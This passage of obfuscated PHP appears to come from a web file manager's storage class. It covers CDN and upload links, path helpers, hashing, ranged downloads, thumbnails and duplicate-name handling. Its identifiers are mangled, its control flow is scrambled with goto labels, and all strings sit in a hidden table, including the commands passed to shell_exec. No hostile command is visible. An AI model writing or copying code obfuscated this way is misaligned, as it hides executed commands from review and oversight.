$GLOBALS[$a¨Ä•Şµ¤À[6]][$a¨Ä•Şµ¤À[88]][$a¨Ä•Şµ¤À[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($b‡Ì†Ò÷Ş) { $A¦ğîè¸¯ =& $_SERVER[Ç³Íß¦Ó]; if (!$this->isCdnHost()) { return $b‡Ì†Ò÷Ş; } return str_replace(trim(get_url_root($b‡Ì†Ò÷Ş), $A¦ğîè¸¯[8]), trim($this->cdnHost, $A¦ğîè¸¯[8]), $b‡Ì†Ò÷Ş); } public function uploadLink($C‘à…Áñêà, $e¬Ø¢¢×Íã = 0) { goto b«Ğ„âë¨; B¶¯¿Ï¡®©: $CïÈÊ«•À = $e¬Ø¢¢×Íã <= $díêÇå±åÙ ? $Dø™È§¿ÒÉ[91] : $Dø™È§¿ÒÉ[92]; $B¿öÕÈŒ = (!$e¬Ø¢¢×Íã ? 1 : ceil($e¬Ø¢¢×Íã / pow(1024, 3))) * 3600 * 4; $BöèË—Ğ°ì = $this->{$CïÈÊ«•À}($C‘à…Áñêà, $B¿öÕÈŒ); goto f”øå÷µ²; b«Ğ„âë¨: $Dø™È§¿ÒÉ =& $_SERVER[Ç³Íß¦Ó]; if ($this->isUploadServer()) { return; } $DñƒŠÓ´Ğ = $this->getType(); goto EÆ»Üò¬ªŠ; f”øå÷µ²: if ($BöèË—Ğ°ì) { $BöèË—Ğ°ì[$Dø™È§¿ÒÉ[93]] = $C‘à…Áñêà; $BöèË—Ğ°ì[$Dø™È§¿ÒÉ[94]] = $DñƒŠÓ´Ğ; } return $BöèË—Ğ°ì; goto A±Û‡·öÆ”; EÆ»Üò¬ªŠ: if (!in_array($DñƒŠÓ´Ğ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $díêÇå±åÙ = 1024 * 1024 * 10; goto B¶¯¿Ï¡®©; A±Û‡·öÆ”: } public function uploadFormData($cğÌ…°ÅÛø, $c’î³¹Îñõ = 3600) { } public function multiUploadFormData($b„èÌ–Á½Œ, $E³õÀ°ŞÛ« = 3600) { } public function download($FçÎˆ±…«•, $a“ŒäÉ‚é×) { } public function ext($Dç­§“š´ë) { $C”´Ì‹„Ä± =& $_SERVER[Ç³Íß¦Ó]; if (strpos($Dç­§“š´ë, $C”´Ì‹„Ä±[8]) === -1) { $f·…š«ÕØ‚ = $Dç­§“š´ë; } else { $f·…š«ÕØ‚ = $this->pathThis($Dç­§“š´ë); } $e£ÙÃ”—óÑ = $C”´Ì‹„Ä±[33]; if (strstr($f·…š«ÕØ‚, $C”´Ì‹„Ä±[95])) { $e£ÙÃ”—óÑ = substr($f·…š«ÕØ‚, strrpos($f·…š«ÕØ‚, $C”´Ì‹„Ä±[95]) + 1); $e£ÙÃ”—óÑ = strtolower($e£ÙÃ”—óÑ); } if (strlen($e£ÙÃ”—óÑ) > 3 && preg_match($C”´Ì‹„Ä±[96], $e£ÙÃ”—óÑ, $CÇæ¤Ğ›îŠ)) { $e£ÙÃ”—óÑ = $C”´Ì‹„Ä±[33]; } return $e£ÙÃ”—óÑ; } public function pathThis($dÊ¦ø¯Ü‰˜) { $eÏÖÛ¨ºÏ =& $_SERVER[Ç³Íß¦Ó]; $dÊ¦ø¯Ü‰˜ = str_replace($eÏÖÛ¨ºÏ[97], $eÏÖÛ¨ºÏ[8], rtrim($dÊ¦ø¯Ü‰˜, $eÏÖÛ¨ºÏ[8])); $D°½‰ËÎåŸ = strrpos($dÊ¦ø¯Ü‰˜, $eÏÖÛ¨ºÏ[8]); if ($D°½‰ËÎåŸ === !1) { return $dÊ¦ø¯Ü‰˜; } return substr($dÊ¦ø¯Ü‰˜, $D°½‰ËÎåŸ + 1); } public function pathFather($e¼—©Ú¿‹) { $cà¯»«¬Â¿ =& $_SERVER[Ç³Íß¦Ó]; $e¼—©Ú¿‹ = str_replace($cà¯»«¬Â¿[97], $cà¯»«¬Â¿[8], rtrim($e¼—©Ú¿‹, $cà¯»«¬Â¿[8])); $eÚ–·í÷™ = strrpos($e¼—©Ú¿‹, $cà¯»«¬Â¿[8]); if ($eÚ–·í÷™ === !1) { return $cà¯»«¬Â¿[33]; } return substr($e¼—©Ú¿‹, 0, $eÚ–·í÷™ + 1); } public function hashSimple($C¨¥“¸ŒÑ–) { goto EÓ°ãª˜Š; A¿§ìÌéÎ: $f°Ô©ÃÆ¦ .= $this->fileSubstr($C¨¥“¸ŒÑ–, $EÆ—À¿Ñé„ - $a¶ˆÛõ¶ä, $a¶ˆÛõ¶ä); return md5($f°Ô©ÃÆ¦) . $EÆ—À¿Ñé„; goto då–µÏô´ë; dÉÂâ¥¨¶Ó: $e¤—Î™À«Š = intval($EÆ—À¿Ñé„ / $A­èç‹˜ß…); $f°Ô©ÃÆ¦ = $cƒÏ©Ùíğ±[33]; for ($eà•‹Ğ³Œ = 0; $eà•‹Ğ³Œ < $A­èç‹˜ß…; $eà•‹Ğ³Œ++) { $f°Ô©ÃÆ¦ .= $this->fileSubstr($C¨¥“¸ŒÑ–, $e¤—Î™À«Š * $eà•‹Ğ³Œ, $a¶ˆÛõ¶ä); } goto A¿§ìÌéÎ; C¿°•›´Ü: $a¶ˆÛõ¶ä = 200; $A­èç‹˜ß… = 50; if ($EÆ—À¿Ñé„ <= $a¶ˆÛõ¶ä * $A­èç‹˜ß…) { return $this->hashMd5($C¨¥“¸ŒÑ–) . $EÆ—À¿Ñé„; } goto dÉÂâ¥¨¶Ó; EÓ°ãª˜Š: $cƒÏ©Ùíğ± =& $_SERVER[Ç³Íß¦Ó]; if (!$C¨¥“¸ŒÑ–) { return md5($cƒÏ©Ùíğ±[33]); } $EÆ—À¿Ñé„ = $this->size($C¨¥“¸ŒÑ–); goto C¿°•›´Ü; då–µÏô´ë: } public static $md5Cache = array(); public function hashMd5($f — ìƒ»š) { $f — ìƒ»š = $this->iconvSystem($f — ìƒ»š); if (isset(self::$md5Cache[$f — ìƒ»š])) { return self::$md5Cache[$f — ìƒ»š]; } self::$md5Cache[$f — ìƒ»š] = $this->hashMd5Shell($f — ìƒ»š); if (!self::$md5Cache[$f — ìƒ»š]) { self::$md5Cache[$f — ìƒ»š] = @md5_file($f — ìƒ»š); } return self::$md5Cache[$f — ìƒ»š]; } private function hashMd5Shell($eÍ®ğİˆÃ) { goto Fí‡‰¿¨à; Fí‡‰¿¨à: $a¹–¥’„Šœ =& $_SERVER[Ç³Íß¦Ó]; if (!function_exists($a¹–¥’„Šœ[98])) { return !1; } $E²ˆ»¾º— = array($a¹–¥’„Šœ[99], $a¹–¥’„Šœ[100]); goto CÁÂïÎîÁ…; CÁÂïÎîÁ…: $D˜“íÑÓ™† = Cache::get($a¹–¥’„Šœ[101]); if (!$D˜“íÑÓ™†) { $c±­´Õï‰© = BASIC_PATH . $a¹–¥’„Šœ[102]; $Fˆºî’Ø” = md5_file($c±­´Õï‰©); $D˜“íÑÓ™† = $a¹–¥’„Šœ[103]; foreach ($E²ˆ»¾º— as $a„ëµòŸÅ) { $A—¶´âôÄÙ = shell_exec($a„ëµòŸÅ . "\40\x22{$c±­´Õï‰©}\x22"); if ($A—¶´âôÄÙ && substr(trim($A—¶´âôÄÙ), 0, 32) == $Fˆºî’Ø”) { $D˜“íÑÓ™† = $a„ëµòŸÅ; break; } } Cache::set($a¹–¥’„Šœ[101], $D˜“íÑÓ™†, 3600); } if ($D˜“íÑÓ™† == $a¹–¥’„Šœ[103]) { return !1; } goto b‰Ö‘ÖŠ°; b‰Ö‘ÖŠ°: $A—¶´âôÄÙ = shell_exec($D˜“íÑÓ™† . "\x20\x22{$eÍ®ğİˆÃ}\x22"); $A—¶´âôÄÙ = str_replace($a¹–¥’„Šœ[104], $a¹–¥’„Šœ[33], $A—¶´âôÄÙ); return substr($A—¶´âôÄÙ, 0, 32); goto FŸÂë¢Æ„Í; FŸÂë¢Æ„Í: } public function link($f†Øï„³ö) { return $f†Øï„³ö; } public function fileOut($eùîÚ·Ëğ, $F‰½ ÎÓ“ = false, $D½ÎÒ“Î”³ = false, $cìöŠÜ”Ò = '') { goto Aê§®êÆ®‘; BÏˆ©®Ú¿: $C†µáœˆæ = strtolower($_SERVER[$cÂí¯ÆÍ–İ[142]]); if ($dÁÕïÀ¾­ && $C†µáœˆæ && $f¯æÏòìÃ) { if (strstr($C†µáœˆæ, $cÂí¯ÆÍ–İ[143])) { header($cÂí¯ÆÍ–İ[144] . $eùîÚ·Ëğ); } else { if (strstr($C†µáœˆæ, $cÂí¯ÆÍ–İ[145])) { header($cÂí¯ÆÍ–İ[146] . $eùîÚ·Ëğ); } else { if (strstr($C†µáœˆæ, $cÂí¯ÆÍ–İ[147])) { header($cÂí¯ÆÍ–İ[148] . $eùîÚ·Ëğ); } } } if ($dç÷ŒÒËˆ) { header($cÂí¯ÆÍ–İ[149] . $dç÷ŒÒËˆ); } return; } if (isset($_SERVER[$cÂí¯ÆÍ–İ[150]])) { if (preg_match($cÂí¯ÆÍ–İ[151], $_SERVER[$cÂí¯ÆÍ–İ[150]], $a•¯ÏĞğ¦)) { $cÑ‡–Š•´Ö = intval($a•¯ÏĞğ¦[1]); if (!empty($a•¯ÏĞğ¦[2])) { $dîÙø†ºÂ¬ = intval($a•¯ÏĞğ¦[2]); } } header($cÂí¯ÆÍ–İ[152]); header("\103\157\156\x74\x65\x6e\164\55\x52\141\156\147\x65\x3a\40\x62\171\x74\145\x73\40{$cÑ‡–Š•´Ö}\55{$dîÙø†ºÂ¬}\x2f" . $E¢¼™â®ìˆ); } else { header($cÂí¯ÆÍ–İ[153]); } goto aÒ¬×ŞÛÚ; bŒÎì†®—™: @ob_end_clean(); set_timeout(); $EÑ¢ÒÃ‚†œ = $this->infoFull($eùîÚ·Ëğ); goto e¹¬ÎÊëô•; aË™×‰Æ: header($cÂí¯ÆÍ–İ[135] . $AŒÕÕÒÀ§¾ . $cÂí¯ÆÍ–İ[127]); header($cÂí¯ÆÍ–İ[136] . $Bƒ¢ï‹­ŠŠ); header($cÂí¯ÆÍ–İ[137]); goto DõÌìæòùŠ; fÈ¸÷–ÌÆ­: header($cÂí¯ÆÍ–İ[128]); header($cÂí¯ÆÍ–İ[129]); header($cÂí¯ÆÍ–İ[130]); goto fˆ›ï®°’¡; E…¼åÕ”¾‡: $cÑ‡–Š•´Ö = 0; $dîÙø†ºÂ¬ = $E¢¼™â®ìˆ - 1; $b‚°×ÂÂ = $this->ext($Bƒ¢ï‹­ŠŠ); goto CÍ·Æï™¸; A¾À‘ïíÑ: $dÁÕïÀ¾­ = $this->getType() == $cÂí¯ÆÍ–İ[106]; $f¯æÏòìÃ = $GLOBALS[$cÂí¯ÆÍ–İ[6]][$cÂí¯ÆÍ–İ[88]][$cÂí¯ÆÍ–İ[107]][$cÂí¯ÆÍ–İ[108]]; $dç÷ŒÒËˆ = (double) $GLOBALS[$cÂí¯ÆÍ–İ[6]][$cÂí¯ÆÍ–İ[88]][$cÂí¯ÆÍ–İ[107]][$cÂí¯ÆÍ–İ[109]] * 1024 * 1024; goto bŒÎì†®—™; DõÌìæòùŠ: header($cÂí¯ÆÍ–İ[138] . $E¢¼™â®ìˆ); header($cÂí¯ÆÍ–İ[139]); if (!$F‰½ ÎÓ“ && $b‚°×ÂÂ == $cÂí¯ÆÍ–İ[140]) { if ($E¢¼™â®ìˆ > 1024 * 1024 * 5) { die; } $D¡™Ö–Ÿ«† = $this->getContent($eùîÚ·Ëğ); $D¡™Ö–Ÿ«† = Html::clearSVG($D¡™Ö–Ÿ«†); header($cÂí¯ÆÍ–İ[141] . strlen($D¡™Ö–Ÿ«†)); echo $D¡™Ö–Ÿ«†; die; } goto BÏˆ©®Ú¿; aÒ¬×ŞÛÚ: $FË‘íéÏà = !0; if ($_SERVER[$cÂí¯ÆÍ–İ[154]] == $cÂí¯ÆÍ–İ[155] && $E¢¼™â®ìˆ > 1204 * 1024 * 1024 * 2) { $FË‘íéÏà = !1; } if ($FË‘íéÏà) { header($cÂí¯ÆÍ–İ[156] . ($dîÙø†ºÂ¬ - $cÑ‡–Š•´Ö + 1)); } goto eŞñôĞÂì‡; Cê·ïÖŒ‘: $cñó™¸è¢ë = $cÂí¯ÆÍ–İ[116] . $cñó™¸è¢ë . $cÂí¯ÆÍ–İ[122] . $cñó™¸è¢ë; if ($F‰½ ÎÓ“) { header($cÂí¯ÆÍ–İ[123]); header($cÂí¯ÆÍ–İ[124] . $cñó™¸è¢ë); } else { header($cÂí¯ÆÍ–İ[125] . $cñó™¸è¢ë); } header($cÂí¯ÆÍ–İ[126] . gmdate($cÂí¯ÆÍ–İ[110], time() + 3600 * 24 * 30) . $cÂí¯ÆÍ–İ[127]); goto fÈ¸÷–ÌÆ­; eÊêˆÙ‘£ù: if ($dç÷ŒÒËˆ) { $BÌÎ‚ÇÏÌÆ = intval(1000 * 1000 * ($bÖôš”Ä™ / $dç÷ŒÒËˆ)); } while ($cÑ‡–Š•´Ö <= $dîÙø†ºÂ¬) { $BÀç‘Í˜œ’ = timeFloat(); check_abort(); $EÅÁ¼‹²— = $dîÙø†ºÂ¬ - $cÑ‡–Š•´Ö + 1; if ($EÅÁ¼‹²— <= $bÖôš”Ä™) { $bÖôš”Ä™ = $EÅÁ¼‹²—; } echo $this->fileSubstr($eùîÚ·Ëğ, $cÑ‡–Š•´Ö, $bÖôš”Ä™); $cÑ‡–Š•´Ö += $bÖôš”Ä™; if ($bÖôš”Ä™ == $EÅÁ¼‹²—) { $cÑ‡–Š•´Ö = $dîÙø†ºÂ¬ + 1; } if ($BÌÎ‚ÇÏÌÆ) { $eÁøÕ’îÃ¬ = intval(1000 * 1000 * (timeFloat() - $BÀç‘Í˜œ’)); $eê¦™ïÄ¨ñ = $BÌÎ‚ÇÏÌÆ - $eÁøÕ’îÃ¬; if ($eê¦™ïÄ¨ñ > 5) { usleep($eê¦™ïÄ¨ñ); } } } goto aáØˆÍÙÂ²; Aê§®êÆ®‘: $cÂí¯ÆÍ–İ =& $_SERVER[Ç³Íß¦Ó]; $this->cacheMethod(null, null); if (!$eùîÚ·Ëğ || !$this->exist($eùîÚ·Ëğ)) { show_json(LNG($cÂí¯ÆÍ–İ[105]), !1, $D½ÎÒ“Î”³); } goto A¾À‘ïíÑ; fˆ›ï®°’¡: if (isset($_SERVER[$cÂí¯ÆÍ–İ[131]]) && strtotime($_SERVER[$cÂí¯ÆÍ–İ[131]]) == $EÑ¢ÒÃ‚†œ[$cÂí¯ÆÍ–İ[84]]) { header($cÂí¯ÆÍ–İ[132], !0, 304); die; } if (isset($_SERVER[$cÂí¯ÆÍ–İ[133]]) && $_SERVER[$cÂí¯ÆÍ–İ[133]] == $cìöŠÜ”Ò) { header($cÂí¯ÆÍ–İ[134] . $cìöŠÜ”Ò, !0, 304); die; } header($cÂí¯ÆÍ–İ[134] . $cìöŠÜ”Ò); goto aË™×‰Æ; e¹¬ÎÊëô•: $E¢¼™â®ìˆ = $EÑ¢ÒÃ‚†œ[$cÂí¯ÆÍ–İ[78]]; $AŒÕÕÒÀ§¾ = gmdate($cÂí¯ÆÍ–İ[110], $EÑ¢ÒÃ‚†œ[$cÂí¯ÆÍ–İ[84]]); $Bƒ¢ï‹­ŠŠ = $D½ÎÒ“Î”³ ? $D½ÎÒ“Î”³ : $this->iconvApp($EÑ¢ÒÃ‚†œ[$cÂí¯ÆÍ–İ[28]]); goto E…¼åÕ”¾‡; ašÔ å›Õ†: $còôŞµ§¥ô = get_file_mime($b‚°×ÂÂ); if (strstr($còôŞµ§¥ô, $cÂí¯ÆÍ–İ[117])) { $còôŞµ§¥ô = $còôŞµ§¥ô . $cÂí¯ÆÍ–İ[118]; } if ($F‰½ ÎÓ“ === !1 && !mime_support($còôŞµ§¥ô)) { $F‰½ ÎÓ“ = !0; $còôŞµ§¥ô = $cÂí¯ÆÍ–İ[119]; } goto AÇÅÏ¹ÀÊ±; eŞñôĞÂì‡: if ($_SERVER[$cÂí¯ÆÍ–İ[157]] == $cÂí¯ÆÍ–İ[158]) { return; } $bÖôš”Ä™ = 1024 * 100; $BÌÎ‚ÇÏÌÆ = 0; goto eÊêˆÙ‘£ù; AÇÅÏ¹ÀÊ±: header($cÂí¯ÆÍ–İ[120]); header($cÂí¯ÆÍ–İ[121] . $còôŞµ§¥ô); $cñó™¸è¢ë = rawurlencode($Bƒ¢ï‹­ŠŠ); goto Cê·ïÖŒ‘; CÍ·Æï™¸: if (in_array($b‚°×ÂÂ, array($cÂí¯ÆÍ–İ[111], $cÂí¯ÆÍ–İ[112], $cÂí¯ÆÍ–İ[113], $cÂí¯ÆÍ–İ[114]))) { $b‚°×ÂÂ = $cÂí¯ÆÍ–İ[115]; } if (!$cìöŠÜ”Ò) { $cìöŠÜ”Ò = md5($AŒÕÕÒÀ§¾ . $this->hashSimple($eùîÚ·Ëğ)); } $cìöŠÜ”Ò = $cÂí¯ÆÍ–İ[116] . $cìöŠÜ”Ò . $cÂí¯ÆÍ–İ[116]; goto ašÔ å›Õ†; aáØˆÍÙÂ²: } public function fileOutServer($F‰›–ÂĞĞ , $dÛñÎ¶“³ = false, $a×øŒå£×ø = false, $f¥Úã× = '') { $this->fileOut($F‰›–ÂĞĞ , $dÛñÎ¶“³, $a×øŒå£×ø, $f¥Úã×); } public function fileOutLink($a«›ó´öéó) { header($_SERVER[Ç³Íß¦Ó][159] . $a«›ó´öéó); die; } public function cacheMethod($eŠÂœçÛ‘‹, $DÇ¾œ„Æ, $a‚µ¢Ùßø½ = null) { goto c›ä—•¬ï; c›ä—•¬ï: $DèÎ’¡Áºé =& $_SERVER[Ç³Íß¦Ó]; static $e›´ôĞã•Œ = array(); $Aã©ë©Æè÷ = $DÇ¾œ„Æ ? ltrim($this->getPathOuter($DÇ¾œ„Æ), $DèÎ’¡Áºé[8]) : $DÇ¾œ„Æ; goto b‹Ñë†¤Ëå; BâˆÚƒÉìÈ: $e•×â•ì÷´ = $this->{$eŠÂœçÛ‘‹}($DÇ¾œ„Æ); $e›´ôĞã•Œ[$FØ´¸ÔÍÜ] = $e•×â•ì÷´; return $e•×â•ì÷´; goto e˜¾çƒÄä‹; Fô‚÷¡İ¨Ã: if (!is_null($a‚µ¢Ùßø½)) { $e›´ôĞã•Œ[$FØ´¸ÔÍÜ] = $a‚µ¢Ùßø½; return; } $e•×â•ì÷´ = isset($e›´ôĞã•Œ[$FØ´¸ÔÍÜ]) ? $e›´ôĞã•Œ[$FØ´¸ÔÍÜ] : null; if (!is_null($e•×â•ì÷´)) { return $e•×â•ì÷´; } goto BâˆÚƒÉìÈ; b‹Ñë†¤Ëå: $FØ´¸ÔÍÜ = $DèÎ’¡Áºé[160] . $eŠÂœçÛ‘‹ . $DèÎ’¡Áºé[161] . rtrim($Aã©ë©Æè÷, $DèÎ’¡Áºé[8]); if (is_null($eŠÂœçÛ‘‹)) { $e›´ôĞã•Œ = array(); return; } if (is_null($DÇ¾œ„Æ)) { unset($e›´ôĞã•Œ[$FØ´¸ÔÍÜ]); return; } goto Fô‚÷¡İ¨Ã; e˜¾çƒÄä‹: } public function fileOutImage($a¶¼®ƒ—®, $d½•›ŸÊÂ = 250) { goto eâ¿™ùŞî½; a™”»Ä´•ô: $c°ùí‰±¹È = "{$B¶¦—ƒˆˆ}\137{$d½•›ŸÊÂ}\x2e\160\x6e\x67"; if (!($AŠŒÌî’œà = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $F”ä÷­•¿[172]))) { $dÆÚ§ç«£½ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $F”ä÷­•¿[173]); } else { $dÆÚ§ç«£½ = KodIO::make($AŠŒÌî’œà); } if ($AŠŒÌî’œà = IO::fileNameExist($dÆÚ§ç«£½, $c°ùí‰±¹È)) { $Eáã‚›ŠšØ = KodIO::make($AŠŒÌî’œà); return IO::fileOut($Eáã‚›ŠšØ, !1, $FâØ£¥¾â); } goto d¾…¼¸ôæ; eâ¿™ùŞî½: $F”ä÷­•¿ =& $_SERVER[Ç³Íß¦Ó]; set_timeout(); if (substr($a¶¼®ƒ—®, 0, 4) == $F”ä÷­•¿[147]) { $this->fileOutLink($a¶¼®ƒ—®); } goto fÔÎ¯‚â‚; AÍèÇ Æ¼è: del_file($Eáã‚›ŠšØ); IO::fileOut($a³·¼‘ãê); goto aÁ¹„ÒÛ›; FÙó¸ê‹Ûå: if (!@file_exists($Eáã‚›ŠšØ)) { $a½“·ÆÎ’³ = TEMP_FILES; if (!is_dir($a½“·ÆÎ’³)) { mk_dir($a½“·ÆÎ’³); } $fØÔæ£©ì = $a½“·ÆÎ’³ . $B¶¦—ƒˆˆ . $F”ä÷­•¿[95] . $B©Ìßöôæ¿[$F”ä÷­•¿[168]]; if (!@file_exists($fØÔæ£©ì)) { $fØÔæ£©ì = $this->download($a¶¼®ƒ—®, $fØÔæ£©ì); } ImageThumb::createThumb($fØÔæ£©ì, $Eáã‚›ŠšØ, $d½•›ŸÊÂ, $d½•›ŸÊÂ * 10); } if (!file_exists($Eáã‚›ŠšØ) || filesize($Eáã‚›ŠšØ) < 100) { return @file_exists($fØÔæ£©ì) ? IO::fileOut($fØÔæ£©ì) : $this->fileOut($a¶¼®ƒ—®); } if (!($a³·¼‘ãê = IO::move($Eáã‚›ŠšØ, $dÆÚ§ç«£½))) { return IO::fileOut($Eáã‚›ŠšØ); } goto AÍèÇ Æ¼è; d¾…¼¸ôæ: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $Eáã‚›ŠšØ = DATA_THUMB . $c°ùí‰±¹È; del_file($Eáã‚›ŠšØ); goto FÙó¸ê‹Ûå; CƒîİÃ˜ñß: if (isset($GLOBALS[$F”ä÷­•¿[162]]) && $GLOBALS[$F”ä÷­•¿[162]][$F”ä÷­•¿[76]] == $B©Ìßöôæ¿[$F”ä÷­•¿[76]]) { $c¾¥†ˆ›¿ = $GLOBALS[$F”ä÷­•¿[162]][$F”ä÷­•¿[163]]; if (!$B©Ìßöôæ¿[$F”ä÷­•¿[164]]) { $B©Ìßöôæ¿[$F”ä÷­•¿[164]] = $GLOBALS[$F”ä÷­•¿[162]]; } if (isset($c¾¥†ˆ›¿[$F”ä÷­•¿[165]])) { if ($c¾¥†ˆ›¿[$F”ä÷­•¿[165]] <= $d½•›ŸÊÂ && $c¾¥†ˆ›¿[$F”ä÷­•¿[166]] <= $d½•›ŸÊÂ) { $B´¿Šİ„¼ = !0; } } $FâØ£¥¾â = $B©Ìßöôæ¿[$F”ä÷­•¿[164]][$F”ä÷­•¿[28]]; } if ($B©Ìßöôæ¿[$F”ä÷­•¿[78]] <= 1024 * 50 || $B´¿Šİ„¼ || !function_exists($F”ä÷­•¿[167]) || $B©Ìßöôæ¿[$F”ä÷­•¿[168]] == $F”ä÷­•¿[169]) { return $this->fileOut($a¶¼®ƒ—®, !1, $FâØ£¥¾â); } if (isset($B©Ìßöôæ¿[$F”ä÷­•¿[164]][$F”ä÷­•¿[170]])) { $B¶¦—ƒˆˆ = $B©Ìßöôæ¿[$F”ä÷­•¿[164]][$F”ä÷­•¿[170]]; } else { if (isset($B©Ìßöôæ¿[$F”ä÷­•¿[164]][$F”ä÷­•¿[171]])) { $B¶¦—ƒˆˆ = $B©Ìßöôæ¿[$F”ä÷­•¿[164]][$F”ä÷­•¿[171]]; } else { $B¶¦—ƒˆˆ = md5("{$B©Ìßöôæ¿[$F”ä÷­•¿[28]]}\x5f{$B©Ìßöôæ¿[$F”ä÷­•¿[76]]}\x5f{$B©Ìßöôæ¿[$F”ä÷­•¿[78]]}"); } } goto a™”»Ä´•ô; fÔÎ¯‚â‚: $B©Ìßöôæ¿ = $this->info($a¶¼®ƒ—®); $FâØ£¥¾â = $B©Ìßöôæ¿[$F”ä÷­•¿[28]]; $B´¿Šİ„¼ = !1; goto CƒîİÃ˜ñß; aÁ¹„ÒÛ›: } public function fileOutImageServer($a–‚Ò‰Ô¦, $D“ÄšÔ”ä‰ = 250) { $this->fileOutImage($a–‚Ò‰Ô¦, $D“ÄšÔ”ä‰); } public function fileNameAuto($bˆÖôÆÇé, $dÂÀ‹Á‚ªš, $b—ÎôÜ¬Ğ‹ = REPEAT_RENAME, $Dğºï¼á¬” = false) { goto b‘×¸ªã½; D´ƒæ˜½‹Ù: if ($b—ÎôÜ¬Ğ‹ == REPEAT_SKIP) { return !1; } $b”¶Ä½ƒÏ˜ = $fè˜°áŒ†—[95] . get_path_ext($dÂÀ‹Á‚ªš); $b”¶Ä½ƒÏ˜ = $b”¶Ä½ƒÏ˜ == $fè˜°áŒ†—[95] || $Dğºï¼á¬” ? $fè˜°áŒ†—[33] : $b”¶Ä½ƒÏ˜; goto eŸîŸõ©Ş; eŸîŸõ©Ş: $b†ĞÚì©ÔÑ = 1; $D¥ˆ×¡‹  = substr($dÂÀ‹Á‚ªš, 0, strlen($dÂÀ‹Á‚ªš) - strlen($b”¶Ä½ƒÏ˜)); $E«Ì–ŠçÇ‰ = $D¥ˆ×¡‹  . "\x28{$b†ĞÚì©ÔÑ}\51{$b”¶Ä½ƒÏ˜}"; goto CÁ¨´’İ‰È; b‘×¸ªã½: $fè˜°áŒ†— =& $_SERVER[Ç³Íß¦Ó]; $bó‘éÄƒ‚ç = $bˆÖôÆÇé === $fè˜°áŒ†—[33] ? $dÂÀ‹Á‚ªš : rtrim($bˆÖôÆÇé, $fè˜°áŒ†—[8]) . $fè˜°áŒ†—[8] . $dÂÀ‹Á‚ªš; if ($b—ÎôÜ¬Ğ‹ == REPEAT_REPLACE || !$this->exist($bó‘éÄƒ‚ç) || $Dğºï¼á¬” && $b—ÎôÜ¬Ğ‹ != REPEAT_RENAME_FOLDER) { return $dÂÀ‹Á‚ªš; } goto D´ƒæ˜½‹Ù; CÁ¨´’İ‰È: while ($this->exist(rtrim($bˆÖôÆÇé, $fè˜°áŒ†—[8]) . $fè˜°áŒ†—[8] . $E«Ì–ŠçÇ‰)) { $E«Ì–ŠçÇ‰ = $D¥ˆ×¡‹  . "\x28{$b†ĞÚì©ÔÑ}\51{$b”¶Ä½ƒÏ˜}"; $b†ĞÚì©ÔÑ++; } return $E«Ì–ŠçÇ‰; goto eö¢–í»Ì; eö¢–í»Ì: } private function fileNameAutoList($Eëø·©©Ù¬, $D‘˜‘‡Œ‹É, $cÖŠáÎˆÀ‰ = false) { goto A““åîÅÖ™; CÌˆ…À…‰›: return $Bº¹ÄÀôãô; goto EÏ±ƒÙ; C‡Õã°œÚ¼: $FÏ¬œ÷ŸÖÖ = substr($D‘˜‘‡Œ‹É, 0, strlen($D‘˜‘‡Œ‹É) - strlen($d©Á˜êñï)); $Bº¹ÄÀôãô = $FÏ¬œ÷ŸÖÖ . "\x28\60\51{$d©Á˜êñï}"; for ($Aç“¢—ğ¡ç = 1; $Aç“¢—ğ¡ç <= count($C¤óöÛ˜æŠ) + 1; $Aç“¢—ğ¡ç++) { $Bº¹ÄÀôãô = $FÏ¬œ÷ŸÖÖ . "\x28{$Aç“¢—ğ¡ç}\51{$d©Á˜êñï}"; if (!in_array_not_case($Bº¹ÄÀôãô, $C¤óöÛ˜æŠ)) { return $Bº¹ÄÀôãô; } } goto CÌˆ…À…‰›; A““åîÅÖ™: $e™ªÉŞåê =& $_SERVER[Ç³Íß¦Ó]; $C’„‡ë‡¨ö = $this->listPath($Eëø·©©Ù¬, !0); $C’„‡ë‡¨ö = array_merge($C’„‡ë‡¨ö[$e™ªÉŞåê[75]], $C’„‡ë‡¨ö[$e™ªÉŞåê[74]]); goto E¬çµ¨¿Õï; E¬çµ¨¿Õï: $C¤óöÛ˜æŠ = array_to_keyvalue($C’„‡ë‡¨ö, $e™ªÉŞåê[33], $e™ªÉŞåê[28]); $d©Á˜êñï = $e™ªÉŞåê[95] . get_path_ext($D‘˜‘‡Œ‹É); $d©Á˜êñï = $d©Á˜êñï == $e™ªÉŞåê[95] || $cÖŠáÎˆÀ‰ ? $e™ªÉŞåê[33] : $d©Á˜êñï; goto C‡Õã°œÚ¼; EÏ±ƒÙ: } public function listAllFiles($DÅÅê±Ù, $bêÍÔê¤Ù¯, $añ›•åÍ¨Ï = array()) { goto B£‰¤¶ŠïÕ; A§Î¬×•³Õ: foreach (array_unique($Bí­–ñ‘»Ø) as $cİ¶îº‰ç) { $cİ„îêåßº = array($fçÔÊŸÏ‡Û[76] => $this->getPathOuter($fçÔÊŸÏ‡Û[8] . $DÅÅê±Ù . $fçÔÊŸÏ‡Û[8] . $cİ¶îº‰ç), $fçÔÊŸÏ‡Û[77] => 1, $fçÔÊŸÏ‡Û[78] => 0); if (substr($cİ¶îº‰ç, -1) != $fçÔÊŸÏ‡Û[8]) { $cİ„îêåßº[$fçÔÊŸÏ‡Û[77]] = 0; $c “¸±ÅËÜ = $this->getPath($DÅÅê±Ù . $fçÔÊŸÏ‡Û[8] . $cİ¶îº‰ç); $cİ„îêåßº[$fçÔÊŸÏ‡Û[78]] = isset($añ›•åÍ¨Ï[$c “¸±ÅËÜ]) ? $añ›•åÍ¨Ï[$c “¸±ÅËÜ] : $this->size($c “¸±ÅËÜ); } $E²…İ¨®å[] = $cİ„îêåßº; } return $E²…İ¨®å; goto fŠ å£ÃœÛ; D¬„ÆîÌ­Å: $DÅÅê±Ù = trim($DÅÅê±Ù, $fçÔÊŸÏ‡Û[8]); foreach ($bêÍÔê¤Ù¯ as $cİ¶îº‰ç) { $cÛ—ğÉ§† = ltrim(substr(trim($cİ¶îº‰ç, $fçÔÊŸÏ‡Û[8]), strlen($DÅÅê±Ù)), $fçÔÊŸÏ‡Û[8]); $Bí­–ñ‘»Ø = array_merge($Bí­–ñ‘»Ø, $this->slicePath($cÛ—ğÉ§†)); } $E²…İ¨®å = array(); goto A§Î¬×•³Õ; B£‰¤¶ŠïÕ: 